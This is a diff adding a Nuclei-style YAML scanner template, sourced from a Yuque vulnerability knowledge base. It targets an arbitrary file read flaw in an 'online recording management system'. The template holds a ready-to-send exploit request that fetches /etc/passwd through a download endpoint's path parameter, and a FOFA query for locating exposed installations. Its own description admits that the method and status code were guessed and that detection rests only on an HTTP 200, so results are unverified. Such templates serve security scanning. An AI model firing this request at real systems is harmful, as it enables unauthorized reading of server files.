@@ -1,0 +1,23 @@
+id: poc-ic02467eadfiyg14
+info:
+  name: 在线录音管理系统download任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ic02467eadfiyg14
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ic02467eadfiyg14
+    fofa: title="在线录音管理系统"
+http:
+- raw:
+  - 'GET /main/download?path=/etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
